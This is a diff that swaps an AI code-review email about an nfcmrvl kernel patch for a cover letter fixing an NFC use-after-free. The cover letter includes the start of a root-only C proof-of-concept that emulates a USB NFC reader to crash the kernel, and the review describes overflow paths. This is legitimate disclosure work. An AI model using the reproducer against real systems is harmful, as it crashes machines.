@@ -1,58 +1,99 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=100.103.45.18
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.214.181
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1794021801;
-	b=ZI8QtiqUPR6/+/obrClN7sgnMr3FT5Nz74iLJ9EeA8KjObdHEKd2ElVkaNigUO/UhTuu
-	 4HR7gjfWAxfpJFuyHdHZ08fiLeQ27M7OjatT8mPWv15A0ogNxSZ2mIpIXjIkVq2ikX8JY
-	 YVnGS2RxHTX47zzYf6iM/0AtBSlUQ6UOuTHDXTBaPZbbuVnxfRuB+d2me8T6Izdd/JFBx
-	 RhcwObQ4px8TQEBEKUlUH7StgM6JAZ9CG3W9UVCz1FAhj3myHuVO37LBt3EoJhfKuhff+
-	 lkuYXPRwbcOguHjCoo7u2d8vbOWRjU8XmnjuDK7iy15Vxu/OKqWDdMdSAo//hSG4I9w==
+	t=1794032379;
+	b=gfchyINwdFqHAXuuRSFP+Fo8kUCOjgSh09dl51oiUt22bBNf8EKykMzeY6Zmvt1qNbcN
+	 DZru2aYjFnfuD5rPE8VH4n1HtCW+U1P5Fi+lYgJc8HlzcLje4bYTWXHlQK3MhEsHIDq0D
+	 NpWCobVo2EGlF7EbkZd/VfAeCOME9X3qlR2ZR/bV51FIocLDllRbnSXnPC+pdvEFvlpZw
+	 ZMEYEC/gfUOJs/9JfK6H6FrN6DBlDRU2pKKnVvdo8RCyGYvNVeEoCBvCZM9qYvIEF67Qf
+	 mkayGv8tM3lyBcUNexmz9hyHzV2AzorEtx6wAt5Omky8nt2NXB/lxI/SD+DptWUvx6Q==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1794021801;
-	h=Received:DKIM-Signature:Subject:From:To:Cc:Date:Message-ID:
-	 In-Reply-To:References:X-sashiko-severity:Content-Type:
-	 Content-Transfer-Encoding:MIME-Version;
-	bh=zxwmtrsC/po3OGrfo16K49WV6xayWvBaG2dVbJUY3I8=;
-	b=JxpUEC7pJVLVdb060SLPMw5NEYG0H8NcZD/yzghCkYL9zRO0t4cZeKrWZk1vV5+ACDdP
-	 vuNmnSILKVYhTtJXjvr9KTPKekNYXXINeqa8rjMbQ9h5SmgyW1A1DA9QIRAoNs134XsqJ
-	 2r8LnIxuO02glp5/NSo7w97pGJ/mC0BTlzHkARGLkvX9wDJmZhx+O47tOxjy8gxloj7pj
-	 bK0k3g5N/J0crMjrmEPHxqcztOWaR8BA6FWZSsaUQB7zigod8FAMrq3ZajIEJwt35EP43
-	 LtfOvBU6xv9rListUG0IirqJiCE0UHDzVVOowyxZ9q4omShoqHgzzlHVqyUSlZeTpKg==
+	a=rsa-sha256; c=relaxed/relaxed; t=1794032379;
+	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
+	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
+	 Message-ID:From:Subject:To:Cc:Date:MIME-Version:Content-Type:
+	 Content-Transfer-Encoding;
+	bh=RZlQjxGmBrGDR4znZBsctnfYXsFN3aqPIkaZL896P6M=;
+	b=fhIhIwcIF5OJB/f/F1g+SV1FApNz57mXzJZ3vk7Y/nl5lN1BToU40ASTErUuqlx7+gsR
+	 gRjmIZYGf2lZfkZe1bHiII+tvci4QNl6VivO7uGJR65MhTOFdvA+Qu47tN75DGDVJlKRT
+	 NY6z4dEyHvWr8zElDa3Z6PtedhcB6UOglHF3eL0QpLeWEoTFycljsnSkcC/8MG8jyyeDX
+	 H30JpuXnxLlXCEUuJ+SpbbFAqq0pY+Ysx3J8hmz5uAhLpM0M0q/1w5WwdiOXU3Z+8gEZj
+	 TLWzy6Zgf1dzFFz6A+25xLiuR9kEpkOoUuc8eju6MpwNO56ki2kI8/Ecw6VBNRfPUfw==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
-	dkim=pass header.d=kernel.org header.i=@kernel.org header.a=rsa-sha256 header.s=k20260515 header.b="Ul7ymH/r";
-	arc=none smtp.remote-ip=100.103.45.18
-Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
-	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
-	 key-exchange X25519 server-signature ECDSA (prime256v1))
+	dmarc=pass header.from=gmail.com;
+	spf=pass smtp.mailfrom=gmail.com;
+	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=GdGKCaA6;
+	arc=none smtp.remote-ip=209.85.214.181
+Received: from mail-pl1-f181.google.com (mail-pl1-f181.google.com [209.85.214.181])
+	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
+	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 589EA606A33B;
-	Sat,  7 Nov 2026 03:23:21 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AAA78606A326
+	for <oe-linux-nfc@lists.linux.dev>; Sat,  7 Nov 2026 06:19:38 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org AAA78606A326
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.a=rsa-sha256 header.s=k20260515 header.b=Ul7ymH/r
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id D52EA1F0089F;
-	Sat,  7 Nov 2026 03:23:20 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
-	s=k20260515; t=1794021801;
-	bh=zxwmtrsC/po3OGrfo16K49WV6xayWvBaG2dVbJUY3I8=;
-	h=Subject:From:To:Cc:Date:In-Reply-To:References;
-	b=Ul7ymH/rTkN3e8cnrMdwbHiLAi6ycnSv+h+1GuKYzSO9PLMZX/P95r4GSEIkpCy2h
-	 lf09ub8opp1u6wW2q+Op4sTXo0RSu7rhuqgq+l1imjwa+rKi1srzxAp7JS6PHTu4iR
-	 mWIazRuRQ2a1OMGWuWsNrn7d5hHF2xea1x2E0I7uxZ/Pczbb8FZH4xZ0knCamLmRSI
-	 PvpnF6Rymrqc/EOOmA8cXZxI9up+lzODis7eweaDPY42SPpu1/BfP9xTi6Gz+9Icxa
-	 gNF85AWuOsBXP419AdvLKzsryblGiNi5PFQce8I3jh3MsvTZmMmTgJzvBxZmWDx5Lt
-	 8nX8fa+t2ohww==
-Subject:
- Re: [PATCH net v7 3/3] nfc: nfcmrvl: stop firmware work before unregistering
-From: netdev-bot+sashiko@kernel.org
-To: shubham@octane.security
-Cc: netdev@vger.kernel.org, oe-linux-nfc@lists.linux.dev, david@ixit.cz,
- horms@kernel.org, gio@octane.security, kuba@kernel.org
-Date: Sat, 07 Nov 2026 03:23:20 +0000
-Message-ID: <179402180045.994134.13635756935686970887@kernel.org>
-In-Reply-To: <20261104062026.80599-4-shubham@octane.security>
-References: <20261104062026.80599-4-shubham@octane.security>
-X-sashiko-severity: Medium
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: 8bit
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=GdGKCaA6
+Received: by mail-pl1-f181.google.com with SMTP id d9443c01a7336-2e95bd1c14cso12221385ad.2
+        for <oe-linux-nfc@lists.linux.dev>; Fri, 06 Nov 2026 22:19:38 -0800 (PST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20260707; t=1794032378; x=1794637178; darn=lists.linux.dev;
+        h=content-transfer-encoding:content-type:mime-version:date:cc:to
+         :subject:from:message-id:from:to:cc:subject:date:message-id:reply-to
+         :content-type;
+        bh=RZlQjxGmBrGDR4znZBsctnfYXsFN3aqPIkaZL896P6M=;
+        b=GdGKCaA6zUFpS4ugcrXnK0FGnfRP4jaSeKl2pFZA35652u1Y2xUAknO8lwQGZTdJfv
+         FXb4H/Ph3r7PfFB3CUrFulC+hCGFKdCdqY879n1JLjX/1sWtsZAaix4f087Ovo2PdoWS
+         3Y5L9LQD8GJQmro07BPYUCVCTLcNMhiwGGBzctaNVDYk5ZaLO3RI4Xlu4Cr7pJb0fNuB
+         vw6ZFcScRtJXjgL0NuMzTf+QRVugYlKse1bgaiq3hWIRRclTAXvbehCAks1TfU1zscnI
+         68xBlT6pQljNjU8CuFJtbPAhIURKUBZvljT25TK6hWrasEx06Rd3M1TPgcRH1VFV0AHK
+         +kuQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1794032378; x=1794637178;
+        h=content-transfer-encoding:content-type:mime-version:date:cc:to
+         :subject:from:message-id:x-gm-gg:x-gm-message-state:from:to:cc
+         :subject:date:message-id:reply-to:content-type;
+        bh=RZlQjxGmBrGDR4znZBsctnfYXsFN3aqPIkaZL896P6M=;
+        b=ixkq8O+H+ETKK+Iy29LWeUzGri211L96UPnKj60cXfz8CgvGQ39USEDptB0rJu7Jny
+         msV8YD92jJEr97QzQbz8ZGslL3TVlzRTaJOzvXKcV++M/LeZJ8YjM73C5oMc0/OGWTMb
+         4KAPWKQ7ceM8zzIgpYumSP5otR+IMHvx+G1Qvz4fmc2qOEUYc/ywn4tnAFcR3dPPRika
+         08GkqOIIHN4MNy7AFifnJSXo70bjawkfp0bFs3KWhOUgwmmOGQyyjNk0dIku6qYcYyKk
+         rsEi0pHFIsPPMkt58F02SRd7Gf685XWLgUpTvg+AFyKzG+9TEkm7+QgVuTecU41V59Ir
+         +ucQ==
+X-Forwarded-Encrypted: i=1; AL+hErGRd3uLQFZ5xNDIs10PAGu6wbN4m3R4Eh8UdMWVaDXkQ2wAir2+U4ffzF3Eks0LtOSXylyMrWFEOyZ7dvs=@lists.linux.dev
+X-Gm-Message-State: APuU4Z9VTPuOFBxOoPPqWPoaGFVoDaDQtehmaP3nHwsQ3tV5xgli4oVg
+	d/blkRNUNQEY1p1YJwzK6t3XnoEFARzViAKcr6JY2Cci90DPYcF5shUE
+X-Gm-Gg: AYBFou1kjaku1fdtuh45ls0lYA4BkQPZw9/qpxcMnUC+uz4DfJX+oJRS/DrsF5+8iN2
+	L/1NoOKqpRFedtKeciHdg9UlRkdfKAibNIqgkpNUyKb7yGFu4KsS78C6Cp0NwvkVyE0JCPNyyT9
+	vGK24TQfhhnCffnzivyHOirlOwh2qRYmaIeo6r0OGzcB1uUFmPh0hvIFlyC6S8hFG9xPccT83LH
+	t+YxBQ3lMGhXQPA/WfAcdaM5PNI+wfRHuMby3o1eeLmH38DvQR2QhgAsOwXRJBSvnYdlXTkHI0F
+	KJd5J2oBsY2NRCqNo8bdovNmRRVUdT7R3HNdxiJSZM0TrE1gxyK3GNI/3ItHQSIk7Bq9alxQlub
+	T5yu8XVPLFEkjic6CEaAR9eWx3DHopVe4k+/m8+OnVlvSUcN4VsnjNYPR0bGCo6YzAIeAHH5Cvv
+	QtrL/P3KpiF3W0BQ4V3wuYNowhkxvSWgbOr86yG6u4Vu/808EOyjpMsjryT1/VVGImDITmClAdP
+	h+yi8f8g5dfrb6xfOaNI4vBe+r99EpHKo83naY9d/5hLAzVF3XuwwDrOi38ZRXw411T6CfQnBnj
+	BieIdaTLwJM1OdkQ+jP2GnfKpuL0gmuoXu25IEbd4VkQz11o1hBvfK162+C3AKxrecaLcme23zx
+	i5GlhElU=
+X-Received: by 2002:a17:903:37c6:b0:2ed:2a1d:e36d with SMTP id d9443c01a7336-2ed40c7b5e1mr53602295ad.36.1794032376169;
+        Fri, 06 Nov 2026 22:19:36 -0800 (PST)
+Received: from cover.eml (awork078078.netvigator.com. [203.198.250.78])
+        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2ed6d5387dcsm1532185ad.21.2026.11.06.22.19.30
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Fri, 06 Nov 2026 22:19:35 -0800 (PST)
+Message-ID: <cover.1793112510.git.xuyuqiabc@gmail.com>
+From: Yuqi Xu <xuyuqiabc@gmail.com>
+Subject: [PATCH net v2 0/1] nfc: digital: fix use-after-free in unregister
+To: netdev@vger.kernel.org, oe-linux-nfc@lists.linux.dev
+Cc: David Heidelberg <david@ixit.cz>, "David S. Miller" <davem@davemloft.net>,
+ Eric Dumazet <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>,
+ Paolo Abeni <pabeni@redhat.com>, Simon Horman <horms@kernel.org>,
+ stable@vger.kernel.org, Vega <vega@nebusec.ai>, Ren Wei <weir@nebusec.ai>,
+ xuyq21@lenovo.com, Mark Greer <mgreer@animalcreek.com>, Uwe =?utf-8?q?Klein?=
+ =?utf-8?q?e-K=C3=B6nig?= (The Capable Hub) <u.kleine-koenig@baylibre.com>,
+ Ian Ray <ian.ray@gehealthcare.com>,
+ Dmitry Torokhov <dmitry.torokhov@gmail.com>,
+ Thierry Escande <thierry.escande@linux.intel.com>,
+ Samuel Ortiz <sameo@linux.intel.com>
+Date: Sat, 07 Nov 2026 14:19:10 +0800
 X-Mailing-List: oe-linux-nfc@lists.linux.dev
 List-Id: <oe-linux-nfc.lists.linux.dev>
 List-Post: <mailto:oe-linux-nfc@lists.linux.dev>
@@ -62,331 +103,1177 @@ List-Unsubscribe: <mailto:oe-linux-nfc+unsubscribe@lists.linux.dev>
 List-Owner: <mailto:oe-linux-nfc+owner@lists.linux.dev>
 Precedence: list
 MIME-Version: 1.0
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
 
-Thank you for your contribution! Sashiko AI review found 4 potential
-issue(s) to consider.
+Hi Linux kernel maintainers,
 
-Critical: 0 · High: 0 (1) · Medium: 2 · Low: 2 (1)
+We found and validated an issue in net/nfc/digital_core.c. Triggering
+it requires root. The reproducer uses raw-gadget and driver unbind,
+which fail from an unprivileged user and from a user namespace.
 
-If you believe none of the issues are legitimate, please reply to each
-issue of Medium severity or higher and explain why the AI is wrong.
-If any of them are legitimate and you plan to respin, please let patchwork
-know by including "pw-bot: cr" as a separate line at the end of your reply
-(one such reply per series is enough).
+This bug is tracked at: https://bugtracker.nebusec.ai/f/822
 
-- [Medium] The new -EBUSY return in nfcmrvl_fw_dnld_start()
-  (fw_dnld.c:595-600) leaves the NFC core's fw_download_in_progress flag…
-- [Medium] The reset-pulse hold-off is enforced only when work is queued,
-  not inside the worker.
-- [Low] The commit carries a Fixes: tag but bundles several changes
-  beyond the teardown UAF fix, and some of them are not in the commit…
-- [Low] fw_dnld_over() calls nfc_fw_download_done() (fw_dnld.c:145)
-  before it clears fw_dnld->completing under rx_lock (lines 147-149).
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-Pre-existing issues:
-- [High] This problem wasn't introduced by this patch, but the firmware-
-  download state machine the patch reworks trusts a 16-bit chunk length…
-- [Low] Frames that arrive while nfcmrvl_chip_reset() holds reset
-  asserted are queued in rx_q (nfcmrvl_fw_dnld_recv_frame(),…
+Changes in v2:
+- Fix a trf7970a timer/remove race reported by Sashiko and Clashiko
+  (High): the delayed timeout work is now stopped after
+  nfc_digital_unregister_device() instead of before taking trf->lock,
+  so an IRQ or command path cannot re-arm it after shutdown and before
+  the device is freed.
+- Free cmd->resp for a command whose completion work was cancelled, and
+  cmd->req for a command that was never submitted to the driver
+  (Medium).
+- Use READ_ONCE()/WRITE_ONCE() for nfc_dev->shutting_down, which is
+  read under cmd_lock but written under the device lock (Low).
+- Document the unregister-time requirement that abort_cmd() must not
+  leave the completion callback armed or running (Low).
+- v1 Link: https://lore.kernel.org/all/cover.1791172164.git.xuyuqiabc@gmail.com/
 
---
+I have kept Simon's Reviewed-by from v1; the v2 changes above are the
+AI-review fixes. Simon, please let me know if you would rather re-review
+this version.
 
-nfc: nfcmrvl: stop firmware work before unregistering
+---- details below ----
 
-This patch adds active, stopping, starting and completing state, protected
-by a new rx_lock, to the nfcmrvl firmware download path. It moves timeout
-completion onto the firmware workqueue and drains the firmware and NCI
-command machinery before nci_unregister_device(). It also rejects
-concurrent downloads, holds frames received during the reset pulse, and
-reports completion with a positive errno.
+Bug details:
 
-> diff --git a/drivers/nfc/nfcmrvl/fw_dnld.c b/drivers/nfc/nfcmrvl/fw_dnld.c
-> index 8b9d5257320dc..6e8608655710d 100644
-> --- a/drivers/nfc/nfcmrvl/fw_dnld.c
-> +++ b/drivers/nfc/nfcmrvl/fw_dnld.c
-> @@ -90,22 +90,50 @@ static struct sk_buff *alloc_lc_skb(struct nfcmrvl_private *priv, uint8_t plen)
->  	return skb;
->  }
+nfc_digital_unregister_device() cancels the poll, command, and
+completion work items, then frees every digital_cmd still queued. It
+does not abort a command the driver has already accepted.
 
-[Severity: High]
-This isn't a bug introduced by this patch, but this patch reworks the
-firmware receive path, and that path trusts the chunk length the
-controller sends.
+Weiming Shi posted a fix for the workqueue re-arm half of this bug in
+July. The AI review of that patch noted that the driver's asynchronous
+completion can still write cmd->resp after the command is freed. This
+version also aborts the in-flight driver command and drains its
+completion, so both halves are covered.
 
-In process_state_fw_dnld(), SUBSTATE_WAIT_COMMAND only checks len against
-its complement before storing it:
+digital_wq_cmd() passes that object to the driver as the completion
+argument. digital_send_cmd_complete() later stores the response with
+cmd->resp = resp. Once unregister has freed cmd, that store is a
+use-after-free.
 
-	len = get_unaligned_le16(skb->data);
-	...
-	priv->fw_dnld.chunk_len = len;
+On Port100 the URB handler does not call into the digital stack
+itself. It queues port100_wq_cmd_complete. Disconnect then returns,
+and devm frees struct port100 while that embedded work_struct is
+still active. The log below is the resulting ODEBUG warning, with
+panic_on_warn set. That same work is what calls back into the freed
+command.
 
-so chunk_len can be as large as 0xFFFF. SUBSTATE_WAIT_ACK_CREDIT then does:
+trf7970a has the same problem through a delayed timeout work and its
+IRQ thread. Its MD listening state was not handled by abort or
+shutdown, so the patch also stops that timer and handles the state
+before the device is released.
 
-	out_skb = alloc_lc_skb(priv, priv->fw_dnld.chunk_len);
-	...
-	skb_put_data(out_skb,
-		     ((uint8_t *)priv->fw_dnld.fw->data) + priv->fw_dnld.offset,
-		     priv->fw_dnld.chunk_len);
+Reproducer:
 
-alloc_lc_skb() takes uint8_t plen, so the skb is sized for
-chunk_len & 0xff, but skb_put_data() copies the full chunk_len. Can a
-controller that sends a chunk_len above 255 trigger skb_over_panic() here?
+  make
+  # as root in the guest
+  ./poc.sh
 
-Separately, SUBSTATE_WAIT_DATA_CREDIT does:
+poc.sh enables panic_on_warn and runs the static binary built from
+the poc.c below. It emulates a Sony Port100 on dummy_hcd, brings the
+NFC device up, starts a poll, withholds the in-flight IN_COMM_RF
+response, and unbinds drivers/port100. The supplied write-up reports
+that this crashes reliably as root.
 
-	priv->fw_dnld.offset += priv->fw_dnld.chunk_len;
+------BEGIN poc.c------
+#define _GNU_SOURCE
+#include <arpa/inet.h>
+#include <dirent.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <linux/genetlink.h>
+#include <linux/netlink.h>
+#include <linux/nfc.h>
+#include <linux/usb/ch9.h>
+#include <pthread.h>
+#include <sched.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <time.h>
+#include <unistd.h>
 
-Neither offset nor binary_config->offset from the firmware header is ever
-checked against fw->size. Can repeated chunks of 255 bytes or less read
-past the end of fw->data?
+#ifndef ARRAY_SIZE
+#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
+#endif
 
-Those bytes go out through nci_send_frame() and nfc_send_to_raw_sock().
-On UART the controller can be a pty attached with N_NCI, which has no
-capability check. A CAP_NET_ADMIN user still has to start the download
-with NFC_CMD_FW_DOWNLOAD.
+#define UDC_NAME_LENGTH_MAX 128
+struct usb_raw_init {
+	uint8_t driver_name[UDC_NAME_LENGTH_MAX];
+	uint8_t device_name[UDC_NAME_LENGTH_MAX];
+	uint8_t speed;
+};
 
-[ ... ]
+enum usb_raw_event_type {
+	USB_RAW_EVENT_INVALID = 0,
+	USB_RAW_EVENT_CONNECT = 1,
+	USB_RAW_EVENT_CONTROL = 2,
+};
 
-> @@ -114,7 +142,11 @@ static void fw_dnld_over(struct nfcmrvl_private *priv, u32 error)
->  		nfcmrvl_chip_halt(priv);
->  	}
->  
-> -	nfc_fw_download_done(priv->ndev->nfc_dev, priv->fw_dnld.name, error);
-> +	nfc_fw_download_done(priv->ndev->nfc_dev, name, result);
-> +
-> +	spin_lock_irqsave(&fw_dnld->rx_lock, flags);
-> +	fw_dnld->completing = false;
-> +	spin_unlock_irqrestore(&fw_dnld->rx_lock, flags);
->  }
+struct usb_raw_event {
+	uint32_t type;
+	uint32_t length;
+	uint8_t data[0];
+};
 
-[Severity: Low]
-Can a new download get a spurious -EBUSY because of this ordering?
+struct usb_raw_ep_io {
+	uint16_t ep;
+	uint16_t flags;
+	uint32_t length;
+	uint8_t data[0];
+};
 
-nfc_fw_download_done() clears dev->fw_download_in_progress and multicasts
-the genl download-done event before completing is cleared. fw_dnld_over()
-does not hold device_lock. An NFC_CMD_FW_DOWNLOAD sent in response to that
-event can therefore reach nfcmrvl_fw_dnld_start() while completing is
-still true:
+#define USB_RAW_IOCTL_INIT _IOW('U', 0, struct usb_raw_init)
+#define USB_RAW_IOCTL_RUN _IO('U', 1)
+#define USB_RAW_IOCTL_EVENT_FETCH _IOR('U', 2, struct usb_raw_event)
+#define USB_RAW_IOCTL_EP0_WRITE _IOW('U', 3, struct usb_raw_ep_io)
+#define USB_RAW_IOCTL_EP0_READ _IOWR('U', 4, struct usb_raw_ep_io)
+#define USB_RAW_IOCTL_EP_ENABLE _IOW('U', 5, struct usb_endpoint_descriptor)
+#define USB_RAW_IOCTL_EP_WRITE _IOW('U', 7, struct usb_raw_ep_io)
+#define USB_RAW_IOCTL_EP_READ _IOWR('U', 8, struct usb_raw_ep_io)
+#define USB_RAW_IOCTL_CONFIGURE _IO('U', 9)
+#define USB_RAW_IOCTL_VBUS_DRAW _IOW('U', 10, uint32_t)
 
-	if (fw_dnld->stopping || fw_dnld->active || fw_dnld->completing) {
-		res = fw_dnld->stopping ? -ENODEV : -EBUSY;
+#define USB_MAX_PACKET_SIZE 4096
+struct usb_raw_control_event {
+	struct usb_raw_event inner;
+	struct usb_ctrlrequest ctrl;
+	uint8_t data[USB_MAX_PACKET_SIZE];
+};
 
-Userspace has been told the download finished, but the next request fails
-with -EBUSY. Swapping the two steps doesn't look safe either: the old
-completion could then clear fw_download_in_progress for the new download.
+struct usb_raw_ep_io_data {
+	struct usb_raw_ep_io inner;
+	uint8_t data[USB_MAX_PACKET_SIZE];
+};
 
-[ ... ]
+#define NLA_ALIGNTO 4
+#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
 
-> @@ -395,62 +439,74 @@ static int process_state_boot(struct nfcmrvl_private *priv,
->  
->  static void fw_dnld_rx_work(struct work_struct *work)
->  {
-
-[ ... ]
-
-> +	skb = skb_dequeue(&fw_dnld->rx_q);
-> +	if (!skb)
-> +		return;
->  
-> -		kfree_skb(skb);
-> +	nfc_send_to_raw_sock(priv->ndev->nfc_dev, skb,
-> +			     RAW_PAYLOAD_NCI, NFC_DIRECTION_RX);
-> +	switch (fw_dnld->state) {
-> +	case STATE_RESET:
-> +		ret = process_state_reset(priv, skb);
-> +		break;
-
-[Severity: Medium]
-Should this worker check starting, active and stopping under rx_lock
-before it dequeues?
-
-The reset-pulse hold-off is only enforced where work is queued: in
-nfcmrvl_fw_dnld_recv_frame() and in the requeue at the end of this
-function. A pending rx_work left over from an earlier download can still
-run. fw_dnld_over() cancels timeout_work and purges rx_q, but it never
-cancels rx_work:
-
-	cancel_work(&fw_dnld->timeout_work);
-	fw_dnld_stop_cmds(priv->ndev);
-	skb_queue_purge(&fw_dnld->rx_q);
-
-rx_work can be left pending in two ways:
-
-  - recv_frame queues it behind timeout_work on the ordered rx_wq.
-  - recv_frame requeues it while rx_work itself is inside fw_dnld_over(),
-    called from process_state_boot() or an error.
-
-If userspace then starts a new download:
-
-nfcmrvl_fw_dnld_start()
-    active = true; starting = true;
-    nfcmrvl_chip_reset()
-        reset asserted, usleep_range(5000, 10000)
-
-        frame arrives, recv_frame queues it without queue_work()
-        stale rx_work runs fw_dnld_rx_work()
-            skb_dequeue() -> process_state_reset() returns -EINVAL
-            fw_dnld_over() -> nfcmrvl_chip_halt()
-
-        reset deasserted
-    active == false, so no timer is armed, and start returns 0
-
-Isn't this the case the commit message says it prevents, where an error
-path asserts reset and the start path later deasserts it?
-
-Would either of these close it:
-
-  - checking the flags in fw_dnld_rx_work() before skb_dequeue(), or
-  - calling cancel_work_sync(&fw_dnld->rx_work) in
-    nfcmrvl_fw_dnld_start() before setting starting?
-
-[ ... ]
-
-> @@ -497,6 +592,14 @@ int nfcmrvl_fw_dnld_start(struct nci_dev *ndev, const char *firmware_name)
->  	if (!firmware_name || !firmware_name[0])
->  		return -EINVAL;
->  
-> +	spin_lock_irqsave(&fw_dnld->rx_lock, flags);
-> +	if (fw_dnld->stopping || fw_dnld->active || fw_dnld->completing) {
-> +		res = fw_dnld->stopping ? -ENODEV : -EBUSY;
-> +		spin_unlock_irqrestore(&fw_dnld->rx_lock, flags);
-> +		return res;
-> +	}
-> +	spin_unlock_irqrestore(&fw_dnld->rx_lock, flags);
-
-[Severity: Medium]
-What happens to the NFC core's fw_download_in_progress flag when this
-returns -EBUSY for a second download?
-
-nfc_fw_download() does not check for a download that is already running,
-and it clears the flag on any driver error:
-
-net/nfc/core.c:nfc_fw_download() {
-	...
-	dev->fw_download_in_progress = true;
-	rc = dev->ops->fw_download(dev, firmware_name);
-	if (rc)
-		dev->fw_download_in_progress = false;
-	...
+static uint16_t le16_checksum_rule(uint16_t value)
+{
+	uint8_t low = (uint8_t)(value & 0xff);
+	uint8_t high = (uint8_t)((value >> 8) & 0xff);
+	return (uint8_t)(~(low + high) + 1);
 }
 
-So a second NFC_CMD_FW_DOWNLOAD sent while download A is active gets
--EBUSY. The core then records that no download is in progress, even
-though A's state machine and timer are still live.
+static uint8_t sum_checksum_rule(const uint8_t *data, size_t len)
+{
+	uint8_t sum = 0;
+	size_t i;
 
-nfcmrvl_nci_recv_frame() decides where frames go based only on that
-flag:
+	for (i = 0; i < len; i++)
+		sum += data[i];
 
-	if (priv->ndev->nfc_dev->fw_download_in_progress) {
-		nfcmrvl_fw_dnld_recv_frame(priv, skb);
+	return (uint8_t)(~sum + 1);
+}
+
+struct port100_ctx {
+	int fd;
+	int ep_in;
+	int ep_out;
+	volatile bool configured;
+	volatile bool running;
+	volatile bool saw_in_comm_rf;
+	pthread_mutex_t lock;
+	pthread_cond_t cond;
+};
+
+struct hog_ctx {
+	volatile bool run;
+	int cpu;
+};
+
+static const uint8_t ack_frame[6] = {0x00, 0x00, 0xff, 0x00, 0xff, 0x00};
+
+static int raw_ep0_write(int fd, const void *data, uint32_t len)
+{
+	struct usb_raw_ep_io_data io;
+
+	memset(&io, 0, sizeof(io));
+	io.inner.ep = 0;
+	io.inner.flags = 0;
+	if (len > sizeof(io.data))
+		len = 0;
+	io.inner.length = len;
+	if (len)
+		memcpy(io.data, data, len);
+
+	return ioctl(fd, USB_RAW_IOCTL_EP0_WRITE, &io);
+}
+
+static int raw_ep0_read(int fd, uint32_t len)
+{
+	struct usb_raw_ep_io_data io;
+
+	memset(&io, 0, sizeof(io));
+	io.inner.ep = 0;
+	io.inner.flags = 0;
+	if (len > sizeof(io.data))
+		len = sizeof(io.data);
+	io.inner.length = len;
+
+	return ioctl(fd, USB_RAW_IOCTL_EP0_READ, &io);
+}
+
+static int raw_ep_write(int fd, int ep, const void *data, uint32_t len)
+{
+	struct usb_raw_ep_io_data io;
+
+	memset(&io, 0, sizeof(io));
+	io.inner.ep = ep;
+	io.inner.flags = 0;
+	if (len > sizeof(io.data))
+		len = sizeof(io.data);
+	io.inner.length = len;
+	if (len)
+		memcpy(io.data, data, len);
+
+	return ioctl(fd, USB_RAW_IOCTL_EP_WRITE, &io);
+}
+
+static int raw_ep_read(int fd, int ep, uint8_t *buf, uint32_t *len)
+{
+	struct usb_raw_ep_io_data io;
+	uint32_t in_len = *len;
+	int rv;
+
+	memset(&io, 0, sizeof(io));
+	io.inner.ep = ep;
+	io.inner.flags = 0;
+	if (in_len > sizeof(io.data))
+		in_len = sizeof(io.data);
+	io.inner.length = in_len;
+
+	rv = ioctl(fd, USB_RAW_IOCTL_EP_READ, &io);
+	if (rv < 0)
+		return rv;
+
+	if (io.inner.length > *len)
+		io.inner.length = *len;
+	memcpy(buf, io.data, io.inner.length);
+	*len = io.inner.length;
+
+	return 0;
+}
+
+static int send_ack(struct port100_ctx *ctx)
+{
+	return raw_ep_write(ctx->fd, ctx->ep_in, ack_frame, sizeof(ack_frame));
+}
+
+static size_t build_port100_response(uint8_t cmd, const uint8_t *payload,
+				     size_t payload_len, uint8_t *out,
+				     size_t out_sz)
+{
+	uint16_t datalen;
+	size_t total;
+	uint8_t dsum;
+
+	datalen = (uint16_t)(2 + payload_len);
+	total = 8 + datalen + 2;
+	if (out_sz < total)
+		return 0;
+
+	out[0] = 0x00;
+	out[1] = 0x00;
+	out[2] = 0xff;
